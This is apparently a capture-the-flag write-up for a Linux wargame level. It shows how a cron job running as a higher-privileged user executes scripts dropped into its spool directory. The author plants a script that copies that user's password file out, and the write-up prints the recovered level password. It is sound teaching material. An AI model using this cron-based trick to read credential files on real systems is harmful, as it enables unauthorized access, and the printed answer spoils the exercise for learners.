# Level 23-24: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. This Level requires you to create a shell-script, which is removed once executed.

## Password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
## Method
These are cron jobs currently running, the breakdown of them is [here](#what-i-learned)
```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
Read the script that the cron jobs are scheduled to run
```
cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```
- The cron jobs are running on a schedule where a script is scanning new scripts in /var/spool/$myname/foo and executing then deleting them (the $myname variable is interchangeable with bandit24 in this example) - there is more info on why [here](#what-i-learned)
- The full script has been broken down [here](#script-breakdown)

Because the scripts in that directory are scanned by the cron job and executed as bandit24 with its privileges, a script placed in that directory can be used to read the /etc/bandit_pass/bandit24 password file.


Created a temp directory to work from as I don't have read and write permission in current directory
```
mktemp -d 
/tmp/tmp.JBDYQt56vj
```
Created a script file using nano which is a simple text-editor
```
cd /tmp/tmp.JBDYQt56vj
nano banditscript.sh
```
Created this script in banditscript.sh which reads the password file and redirects the output to a new file to be created within the tmp directory
```
cat /etc/bandit_pass/bandit24 > /tmp/tmp.JBDYQt56vj/password.txt
```
Give execute and write permissions to public for script file and directory so that the script can be executed by anyone i.e. bandit24, and the directory can be written into by anyone to create the password file which is where the output from 'cat' will be redirected to 
```
chmod +x banditscript.sh
chmod +w .
```
Copy script into the directory that is scanned by cron job's scheduled script
```
cp banditscript.sh /var/spool/bandit24/foo
```
Listed contents in tmp directory - once the cron job ran on its schedule, the script was executed
```
ls 
banditscript.sh
ls
banditscript.sh password.txt
cat password.txt
```

### What I learned:
In both jobs, you can see 'bandit24 /usr/bin/cronjob_bandit24.sh' indicating that the script is being run as bandit24. In the second job, the '* * * * *' normally each represent a time that the script is scheduled for which are the minute, the hour, the day of the month, the month, the day of the week; in that respective order. An asterisk (*) represents **'every'** so the '* * * * *' job is running the script and scanning directory for new scripts to execute and delete every minute of every hour of every day. The @reboot job runs the script once when the system starts up/server reboots likely for initialisation purposes.

### Script Breakdown:
```
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```
- 'for i in * .*;' means that 'i' will represent any file (*) in the current directory, and any dotfile (.*).

- 'if ["$i != "."] && ["$i != ".."]; then' this line iterates that if the variable 'i' (the filename as mentioned previously) is not (!=) equal to "." (in the current directory) and is not ".." (the directory above) 'then' the following block of code will be executed.

- 'echo "Handling $i" the file is going to be handled by doing the following actions:

 - 'owner="$(stat --format "%U" "./$i")"' - firstly checking the owner of the file
 - 'if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then' if the owner of the file is bandit23 '&&' and (meaning AND - both conditions must be true for the next action to happen) and '[-f "$i"]' if $i is a **regular file** and not a directory, then the next action will be taken
 - 'timeout -s 9 60 "./$i"' the command will be run with a time limit through 'timeout', and when it times out, '-s 9' sends signal 9, which kills the script ("./$i")
- 'fi' ends the inner if statement
- 'rm -rf "./$i" fi' the file is removed and the outer if is closed
- 'done' closes the loop that began with 'for'
